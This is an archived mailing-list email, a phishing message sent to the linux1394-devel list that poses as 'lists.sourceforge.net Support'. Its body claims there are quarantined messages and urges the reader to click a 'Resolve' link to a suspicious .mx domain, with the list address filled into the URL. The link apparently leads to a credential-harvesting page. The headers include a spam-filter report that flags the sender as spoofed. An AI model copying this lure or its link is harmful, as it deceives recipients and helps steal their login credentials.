Return-Path: <linux1394-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+linux1394-devel@lfdr.de
Delivered-To: lists+linux1394-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 2DF5E1AFE91
	for <lists+linux1394-devel@lfdr.de>; Mon, 20 Apr 2020 00:20:32 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-2.v29.lw.sourceforge.com)
	by sfs-ml-2.v29.lw.sourceforge.com with esmtp (Exim 4.90_1)
	(envelope-from <linux1394-devel-bounces@lists.sourceforge.net>)
	id 1jQIIV-0003hX-UK; Sun, 19 Apr 2020 22:20:19 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-2.v29.lw.sourceforge.com with esmtps
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.90_1)
 (envelope-from <heaven689322@gmail.com>) id 1jQIIU-0003hN-Gg
 for linux1394-devel@lists.sourceforge.net; Sun, 19 Apr 2020 22:20:18 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Reply-To:Sender:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=ebSa8q5qDmeAIQEs2JSq0XfjxrNnvVyJmvWtGfNIDHw=; b=JFDJJqE/wcxAqho2M+dp1b3rFb
 Oaj+AAyCGM0TaJhQAVGMGzfXlGkq5N9omIuM+0pWDsLI7+wLn3aQrSD+u+h+xq7P+MVmzQtIfjSt4
 sK4WbNkid3syyOCuph43EAeD4MzAj/hjkJ3ujUBsO4DfXEkLvf1XOt9KIboXnr7+hkl0=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Reply-To:Sender:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=ebSa8q5qDmeAIQEs2JSq0XfjxrNnvVyJmvWtGfNIDHw=; b=j
 7hgVteTQnItsow22tZSVzU11lIYob/IDko5fJ0nkW1ANhZQ6rT/XPsr8gCCjx7f6iZuQKAGN1veNL
 UeRWv2NFyjn0LO0xxjNSVwbdR15u3PLXk/iYOeOc9z988jOpvNaBXGOTxfmBNQoe2brZC20WC/9QW
 nl1wexV4E6Cw8WIk=;
Received: from mail0.vacuumcleanerservicecentre.uk ([104.168.146.109])
 by sfi-mx-1.v28.lw.sourceforge.com with esmtps
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.92.2)
 id 1jQIIS-006UIW-Ls
 for linux1394-devel@lists.sourceforge.net; Sun, 19 Apr 2020 22:20:18 +0000
From: linux1394-devel>contact@uctionhub.co.uk>
To: linux1394-devel@lists.sourceforge.net
Subject: Membership Validation
Date: 19 Apr 2020 15:20:08 -0700
Message-ID: <20200419152008.D51576E6EDD352FB@uctionhub.co.uk>
MIME-Version: 1.0
X-Spam-Score: 7.3 (+++++++)
X-Spam-Report: Spam Filtering performed by mx.sourceforge.net.
 See http://spamassassin.org/tag/ for more details.
 0.0 URIBL_BLOCKED ADMINISTRATOR NOTICE: The query to URIBL was blocked.
 See
 http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
 for more information. [URIs: lologdl.mx]
 0.0 FREEMAIL_FROM Sender email is commonly abused enduser mail provider
 (heaven689322[at]gmail.com)
 0.2 HEADER_FROM_DIFFERENT_DOMAINS From and EnvelopeFrom 2nd level mail
 domains are different
 1.0 SPF_SOFTFAIL           SPF: sender does not match SPF record (softfail)
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 0.2 FREEMAIL_REPLYTO_END_DIGIT Reply-To freemail username ends in digit
 (amgamg774[at]yandex.ru)
 0.2 FREEMAIL_ENVFROM_END_DIGIT Envelope-from freemail username ends in
 digit (heaven689322[at]gmail.com)
 1.0 HTML_MESSAGE           BODY: HTML included in message
 2.3 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.2 FREEMAIL_FORGED_FROMDOMAIN 2nd level domains in From and EnvelopeFrom
 freemail headers are different
 2.0 SPOOFED_FREEMAIL       No description available.
X-Headers-End: 1jQIIS-006UIW-Ls
X-BeenThere: linux1394-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: Linux IEEE 1394 development list
 <linux1394-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/linux1394-devel>, 
 <mailto:linux1394-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=linux1394-devel>
List-Post: <mailto:linux1394-devel@lists.sourceforge.net>
List-Help: <mailto:linux1394-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/linux1394-devel>, 
 <mailto:linux1394-devel-request@lists.sourceforge.net?subject=subscribe>
Reply-To: amgamg774@yandex.ru
Content-Type: multipart/mixed; boundary="===============7072240353959863162=="
Errors-To: linux1394-devel-bounces@lists.sourceforge.net

--===============7072240353959863162==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
w3.org/TR/html4/loose.dtd">

<HTML><HEAD>
<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.16438"></HEAD>
<BODY style=3D"MARGIN: 0.5em">
<DIV style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 12pt; FONT-FAMILY: Calibri=
, Arial, Helvetica, sans-serif; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: ba=
seline; WHITE-SPACE: normal; BORDER-BOTTOM-WIDTH: 0px; WORD-SPACING: 0px; T=
EXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(12,100,192); PADDING-BOTT=
OM: 0px; FONT-STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0=
px; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; PADDING-RIGHT: 0px; BORD=
ER-TOP-WIDTH: 0px; BACKGROUND-COLOR:=20
rgb(255,255,255); TEXT-INDENT: 0px; -webkit-font-smoothing: antialiased; fo=
nt-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-strok=
e-width: 0px; text-decoration-style: initial; text-decoration-color: initia=
l; font-stretch: inherit; font-variant-numeric: inherit; font-variant-east-=
asian: inherit"><FONT color=3D#174e86 size=3D2>Dear linux1394-devel,<BR><BR=
>You have some quarantined messages due to some technical issues&nbsp;with =
the mail&nbsp;exchange server.<BR><BR>
Messages you send may not be displayed properly<BR><BR>Kindly resolve the i=
ssues below<BR><BR><A href=3D"http://lologdl.mx/js/optimal/dec/zoho/index.p=
hp?email=3Dlinux1394-devel@lists.sourceforge.net&amp;id=3Dtrf567545tyfg76t4=
e4egu8y7t6rrtgguid54e56t7giu9t56dtrvjhjjojtft7678gugutr6fyt677y">Resolve<BR=
></A><BR>Thanks for your prompt action.<BR><BR>If the issue persists, conta=
ct the admin.<BR><BR>Sincerely lists.sourceforge.net Support.<BR><BR><BR><B=
R><BR><BR></FONT></DIV></BODY></HTML>


--===============7072240353959863162==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============7072240353959863162==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
mailing list linux1394-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/linux1394-devel

--===============7072240353959863162==--
